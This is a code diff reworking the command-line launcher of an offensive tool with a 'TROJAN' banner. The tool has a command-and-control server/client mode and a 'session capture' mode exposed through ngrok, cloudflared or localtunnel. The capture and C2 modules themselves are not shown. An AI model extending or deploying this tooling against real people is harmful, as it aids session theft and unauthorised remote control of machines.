@@ -5,190 +5,100 @@ import sys
 import subprocess
 import time
 import traceback
+from colorama import init, Fore, Back, Style
+import argparse
 
+
+
+
+init(autoreset=True)
 
 class main(Session):
-    def __init__(self):
+    def __init__(self, args):
         super().__init__()
-        self.print_banner()
-        while True:
-            self.options()
-            selected = input("Enter option: ").strip()
-            self.run(selected)
+        self.args = args
+       
+        if self.args.mode == "session":
+            self.handle_session()
+        elif self.args.mode == "c2":
+            self.start()
 
-    def print_banner(self) -> None:
-        print(
-            """
-        ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗
-        ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║
-            ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║
-            ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║
-            ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║
-            ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
-            by Zohaib Ud Din
-            """
-        )
+           
+   
 
-    def options(self):
-        options = {
-            "0":"Exit",
-            "1": "List of targets sessions",
-            "2": "Refresh targets sessions list",
-            "3": "Create new target session",
-        }
-        print("select option: ")
-        for key, value in options.items():
-            print(f"{key}: {value}")
+    def handle_session(self):   
+        if self.args.session == "create":
+            self.create_tunnel_session()
+        elif self.args.session == "list":
+            self.list_sessions()
 
-    def run(self, selected: str) -> None:
-        if selected == "0":
-            self.exit()
+    def create_tunnel_session(self):
+        """Launch tunnel capture"""
+        print("\n🎣 SESSION CAPTURE TUNNEL")
+
+        tunnel = self.args.tunnel
+        if not tunnel:
+            print("❌ Invalid tunnel")
             return
 
-        if selected == "1":
-            sessions = self.getSessions()
-            if not sessions:
-                print("No sessions found yet.")
-                return
+        print(f"\n[*] Starting {tunnel} capture server...")
+        subprocess.run([sys.executable, "app.py", "--tunnel", tunnel], check=False)
 
-            session_choice = input("Pick session number: ").strip()
-            session_data = self.loadSession(session_choice)
-            if not session_data:
-                print("Invalid session selection.")
-                return
 
-            # session files are stored as a list of entries; use the latest entry
-            self.start(session_data[-1])
-            return
+    def start(self):
+        try:
+            if self.args.type == "server":
+                ip = self.args.ip
+                port = self.args.port
+                print(f"\n[*] 🚀 SERVER on {ip}:{port}")
+                self.c2 = C2Server(ip, port)
+                self.c2.start_server()
+            elif self.args.type == "client":
+                ip = self.args.ip
+                port = self.args.port
+                print(f"\n[*] 🔗 CLIENT → {ip}:{port}")
+                self.c2 = C2Server(ip, port)
+                self.c2.start_client()
+            else:
+                print("❌ Invalid option!")
 
-        if selected == "2":
-            # refresh list
-            self.sessions = {}
-            sessions = self.getSessions()
-            if not sessions:
-                print("No sessions found yet.")
-            return
-
-        if selected == "3":
-            print("Select tunnel provider:")
-            print("1) ngrok")
-            print("2) cloudflared")
-            print("3) localtunnel")
-            tunnel_choice = input("type 1, 2 or 3: ").strip()
-
-            tunnel_map = {
-                "1": "ngrok",
-                "2": "cloudflared",
-                "3": "localtunnel",
-            }
-            tunnel_provider = tunnel_map.get(tunnel_choice)
-            if not tunnel_provider:
-                print("Invalid tunnel option. Please type 1, 2, or 3.")
-                return
-
-            print(f"Starting capture server with {tunnel_provider} tunnel...\n")
-            subprocess.run([sys.executable, "app.py", "--tunnel", tunnel_provider], check=False)
-            return
-
-        print("Invalid option. Please select 0, 1, 2 or 3.")
-
-    def get_ip(self, session_data):
-        ip_options = {
-            "0": "Exit",
-            "1": f"Localhost ({session_data['local_ip']})",
-            "2": f"Public IP ({session_data['ip']})",
-            "3": "Use IP 0.0.0.0",
-        }
-        print("select ip option: ")
-        for key, value in ip_options.items():
-            print(f"{key}: {value}")
-        selected_ipo = input("Enter ip option: ").strip()
-
-        if selected_ipo == "0":
-            self.exit()
-        elif selected_ipo == "2":
-            ip = session_data['ip']
-        elif selected_ipo == "1":
-            ip = session_data['local_ip']
-        elif selected_ipo == "3":
-            ip = "0.0.0.0"
-        else:
-            return self.get_ip(session_data)
-
-        return ip
-
-    def get_port(self):
-        options = {
-            "0": "Exit",
-            "1": "Use default port (7706)",
-            "2": "Use custom port",
-        }
-
-        print("select port option: ")
-        for key, value in options.items():
-            print(f"{key}: {value}")
-        selected_port = input("Enter port option: ").strip()
-
-        if selected_port == "0":
-            self.exit()
-        if selected_port == "2":
-            port = input("Enter port: ").strip()
-        else:
-            port = "7706"
-        return port
-
-    def start(self, session_data):
-        while True:  # Auto-restart loop
-            try:
-                ip = self.get_ip(session_data)
-                port = self.get_port()
-
-                
-                options = {
-                    "0": "Exit",
-                    "1": "Listen C2 server", 
-                    "2": "Send C2 server",
-                }
-                print("\n" + "="*50)
-                print("C2 CONTROL PANEL")
-                for key, value in options.items():
-                    print(f"{key}: {value}")
-                print("="*50)
-
-                selected = input("Enter C2 option: ").strip()
-
-                if selected == "0":
-                    self.exit()
-                    return  # Permanent exit
-
-                elif selected == "1":
-                    print(f"\n[*] Starting SERVER on {ip}:{port}")
-                    self.c2 = C2Server(ip, port)
-                    self.c2.start_server()
-                elif selected == "2":
-                    print(f"\n[*] Starting CLIENT to {ip}:{port}")
-                    self.c2 = C2Server(ip, port)
-                    self.c2.start_client()
-
-                else:
-                    print("❌ Invalid option! Try again.")
-                    continue
-
-            except KeyboardInterrupt:
-                print("\n[*] Interrupted - returning to menu...")
-                continue
-                
-            except Exception as e:
-                print(f"\n❌ CRITICAL ERROR: {e}")
-                print("🔄 Auto-restarting to IP selection...")
-                time.sleep(2)
-                continue  # Restart from IP selection
+        except KeyboardInterrupt:
+            print("\n[*] Returning to menu...")
+            
+        except Exception as e:
+            print(f"\n❌ C2 Error: {e}")
+            time.sleep(2)
 
     def exit(self):
         print("[!] Exiting...")
         os._exit(0)
 
 
-
 if __name__ == "__main__":
-    main()
+    print(Fore.RED + Style.BRIGHT +"""
+            ████████╗███████╗████████╗ ██████╗███████╗███╗   ██╗
+            ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║
+               ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║
+               ██║   ██╔══██╗██║   ██║║██  ██║██╔══██║██║╚██╗██║
+               ██║   ██║  ██║╚██████╔ ║██████║██║  ██║██║ ╚████║
+               ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝
+               Advanced Pentest Session Capture v3.0
+               by Z.hackers Enhanced
+     """)
+
+    parser = argparse.ArgumentParser()
+    mode = parser.add_subparsers(dest="mode")
+
+    c2_parser =mode.add_parser("c2")
+    c2_parser.add_argument("--ip", default="0.0.0.0", type=str, help="0.0.0.0")
+    c2_parser.add_argument("--port", default="7706", type=int, help="7706")
+    c2_parser.add_argument("--type", default="server", type=str, help="server / client")
+
+
+    session_parser = mode.add_parser("session")
+    session_parser.add_argument("--session", default="Create", type=str, help="list / create")
+    session_parser.add_argument("--tunnel", default="localtunnel", type=str, help="ngrok / cloudflared /localtunnel")
+
+     
+    args = parser.parse_args()
+    main(args)
